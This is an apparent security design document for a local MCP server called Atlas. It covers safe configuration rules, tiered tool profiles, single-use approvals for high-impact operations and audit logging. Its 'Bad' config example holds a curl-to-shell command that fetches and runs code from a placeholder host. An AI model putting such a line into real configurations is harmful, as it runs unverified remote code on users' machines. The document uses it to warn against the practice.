# MCP Security

Atlas MCP is local stdio only. It does not run an HTTP server, accept remote clients, dynamically register subcommands, or turn MCP input into shell command strings.

Recent MCP ecosystem advisories have focused on unsafe stdio configuration and attacker-controlled command execution. Atlas avoids that class of issue by keeping the server command explicit, boring, and local.

## Safe Configuration Rules

- Pin the server command to an absolute `tracker` path.
- Do not use `sh -c`, `npx`, curl pipes, or unpinned wrapper scripts in MCP config.
- Do not paste MCP config snippets from untrusted repositories or tickets.
- Do not let workspace files rewrite user MCP config.
- Do not configure Atlas MCP from arbitrary command strings.
- Do not expose high-impact tools in default setup docs.
- Treat tool annotations as hints, not authorization.
- Keep `--init-if-missing` opt-in. Use it only with an explicit absolute `--workspace` path to an existing directory and a write-capable profile.

Good:

```toml
[mcp_servers.atlas]
command = "/usr/local/bin/tracker"
args = ["mcp", "serve", "--workspace", "/path/to/workspace", "--tool-profile", "read"]
```

Bad:

```toml
[mcp_servers.atlas]
command = "sh"
args = ["-c", "curl https://example.invalid/install | sh && tracker mcp serve"]
```

## Safety Tiers

Profiles widen cumulatively:

1. `read`: 41 read-only and plan/dry-run tools.
2. `workflow`: 73 tools, adding the project container plus Atlas ticket, agent, team, schedule, evidence, and handoff operations.
3. `delivery`: 77 tools normally or 79 with the high-impact flag, adding run dispatch and provider-backed change/check synchronization.
4. `admin`: 77 tools normally or the full 88-tool inventory with the high-impact flag.

Tracked workflow mutations require actor, non-empty reason, permissions, event metadata, and the write lock. `atlas.project.create` is the narrow container exception: its closed schema accepts only `key` and `name`; it uses project validation and the write lock but has no actor/reason inputs and creates no event.

High-impact tools are a separate class inside delivery or admin. They cover provider review/merge,
sync push/pull, bundle/import apply, archive apply/restore, compact, worktree cleanup, and gate waiver.
`atlas.ticket.complete` is a normal workflow tool and still follows Atlas completion policy and gates.

All tool inputs use closed schemas (`additionalProperties: false`). The adapter rejects unknown names and wrong types; it does not reinterpret misspellings as aliases. `atlas.ticket.edit` exposes only the ordinary fields named in its schema and cannot be used to change status, policy, project identity, timestamps, lease state, or archive state.

High-impact execution requires:

- selected profile allows the tool
- `--dangerously-allow-high-impact-tools`
- actor and non-empty reason
- existing Atlas permission policy
- one-time operation approval created outside MCP
- exact operation, target, and actor match
- unexpired, unused approval
- final policy recheck immediately before execution

Denied high-impact attempts are written to `.tracker/runtime/mcp/security-audit.jsonl`. The MCP runtime directory is created with mode `0700`; audit and approval files use mode `0600`. Denial records do not include raw approval IDs; they only record whether an approval ID was supplied. Successful high-impact execution records keep the approval ID so an executed mutation can be tied back to the human approval. If a handler fails after consuming an approval, Atlas records an `execution_failed` row with the approval ID because the approval is already single-use at that point.

## Governance Alignment

The trust/governance model does not make Atlas MCP-first. The adapter does not expose private-key operations or trust mutations.

High-impact MCP tools evaluate the same service-layer permission and governance checks as CLI, shell, and TUI paths. MCP approval tokens remain a transport safety gate, not proof that the actor has Atlas authority.

Operation approvals can only be issued by `tracker mcp approve-operation` outside MCP. Tool discovery, a write-capable profile, and valid arguments never authorize a high-impact operation on their own.

## Bootstrap Boundary

The only MCP startup path that can initialize a missing workspace is the explicit form:

```bash
tracker mcp serve --workspace /absolute/existing/repo --init-if-missing --tool-profile workflow
```

Bootstrap is noninteractive and refuses a missing or relative workspace path, nested Atlas workspaces, `--read-only`, and initialization outputs redirected through existing filesystem entries. It creates Atlas workspace state only. It does not register an MCP client or install agent integrations. Without `--init-if-missing`, the server preserves the normal fail-closed behavior for an uninitialized directory.

## References

- [MCP tools specification](https://mcp.mintlify.app/specification/2025-11-25/server/tools)
- [Official MCP Go SDK](https://github.com/modelcontextprotocol/go-sdk)
